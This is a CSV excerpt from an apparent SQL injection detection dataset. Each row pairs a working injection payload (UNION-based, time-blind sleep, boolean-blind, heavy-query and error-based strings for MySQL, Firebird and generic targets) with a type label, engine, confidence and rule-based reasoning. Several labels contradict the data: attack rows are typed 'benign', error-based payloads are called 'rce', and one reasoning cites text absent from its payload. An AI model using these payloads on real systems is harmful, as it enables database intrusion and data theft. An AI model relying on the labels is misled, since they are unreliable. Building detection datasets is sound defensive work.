row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
7380,select ( case when ( 4006 = 1276 ) then 1 else 4006* ( select 4006 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7381,"1'+ ( select 'tzey' where 4491 = 4491 union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7382,"select count ( * ) from generate_series ( 1,5000000 ) # fnck",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
7383,1 order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7384,1 ) ) as xbii where 2262 = 2262 or sleep ( 5 ) --,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
7385,-9340 ) where 5462 = 5462 or 3038 = 3038,1,,boolean_blind,generic,0.95,5462 = 5462 or detected — boolean_blind injection (priority 8) on generic,rule-based
7386,1' ) or sleep ( 5 ) and ( 'fizk' = 'fizk,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
7387,"-6405 ) as ilah where 5145 = 5145 union all select 5145,5145,5145,5145,5145--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7388,1 ) ) and ( 4169 = 9887 ) *9887 and ( ( 1137 = 1137,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
7389,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
7390,1 ) where 6472 = 6472,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7391,"1%"" ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ""%"" = """,1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
7392,-4595' ) where 4892 = 4892 order by 1--,1,,boolean_blind,generic,0.95,4892 = 4892 or detected — boolean_blind injection (priority 8) on generic,rule-based
7393,"1 ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( 8294 = 8294",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
